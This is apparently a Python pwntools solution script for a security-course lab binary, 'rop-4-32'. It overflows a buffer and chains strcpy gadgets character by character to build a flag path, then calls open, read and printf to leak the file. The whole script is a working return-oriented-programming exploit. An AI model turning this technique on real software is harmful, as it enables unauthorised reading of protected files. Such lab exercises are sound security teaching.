#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-4-32')


#addr of /: 0x80487e0
#addr of string: 0x8048768 "the quick..."
#addr of dest: 0x804a800
#addr of string2: 0x8048798 "I also put this for you: 123456789-"


buf = "A" * 0x88 + "BBBB"

"""
0x080483c0  read@plt
0x080483d0  printf@plt
0x080483e0  chdir@plt
0x080483f0  puts@plt
0x08048400  open@plt
0x0804858e  strcpy
"""
strcpy_ = p32(0x0804858e)
read_ = p32(0x080483c0)
open_ = p32(0x08048400)
printf_ = p32(0x080483d0)

g_addr = p32(0x804a800)

"""
0x080483a9 : pop ebx ; ret
0x080486d3 : pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x0804873a : pop edi ; pop ebp ; ret
0x08048739 : pop esi ; pop edi ; pop ebp ; ret
"""

pop_ret = p32(0x080483a9)
pop_pop_ret = p32(0x0804873a)
pop_pop_pop_ret = p32(0x08048739)

#/
buf += strcpy_
buf += pop_pop_ret
buf += g_addr
buf += p32(0x80487e0)

#/h
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a801)
buf += p32(0x8048769)

#/ho
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a802)
buf += p32(0x8048774)

#/hom
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a803)
buf += p32(0x804877e)

#/home
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a804)
buf += p32(0x804876a)

#/home/
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a805)
buf += p32(0x80487e0)

#/home/la
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a806)
buf += p32(0x804878B)

#/home/lab
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a808)
buf += p32(0x8048772)

#/home/labs
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a809)
buf += p32(0x8048780)

#/home/labs/
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a80a)
buf += p32(0x80487e0)

#/home/labs/w
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a80b)
buf += p32(0x8048775)

#/home/labs/we
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a80c)
buf += p32(0x804876a)

#/home/labs/wee
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a80d)
buf += p32(0x804876a)

#/home/labs/week
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a80e)
buf += p32(0x8048770)

#/home/labs/week5
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a80f)
buf += p32(0x80487b5)

#/home/labs/week5/
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a810)
buf += p32(0x80487e0)

#/home/labs/week5/ro
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a811)
buf += p32(0x8048773)

#/home/labs/week5/rop
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a813)
buf += p32(0x804877f)

#/home/labs/week5/rop-
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a814)
buf += p32(0x80487bb)

#/home/labs/week5/rop-4
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a815)
buf += p32(0x80487b4)

#/home/labs/week5/rop-4-
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a816)
buf += p32(0x80487bb)

#/home/labs/week5/rop-4-3
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a817)
buf += p32(0x80487b3)

#/home/labs/week5/rop-4-32
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a818)
buf += p32(0x80487b2)

#/home/labs/week5/rop-4-32/
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a819)
buf += p32(0x80487e0)

#/home/labs/week5/rop-4-32/f
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a81a)
buf += p32(0x8048778)

#/home/labs/week5/rop-4-32/fla
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a81b)
buf += p32(0x804878b)

#/home/labs/week5/rop-4-32/flag
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a81d)
buf += p32(0x8048792)

#/home/labs/week5/rop-4-32/flag\0
buf += strcpy_
buf += pop_pop_ret
buf += p32(0x804a81e)
buf += p32(0x8048794)

buf += open_
buf += pop_pop_ret
buf += p32(0x804a800)
buf += p32(0)

buf += read_
buf += pop_pop_pop_ret
buf += p32(3)
buf += p32(0x804aa00)
buf += p32(100)

buf += printf_
buf += pop_ret
buf += p32(0x804aa00)

with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()
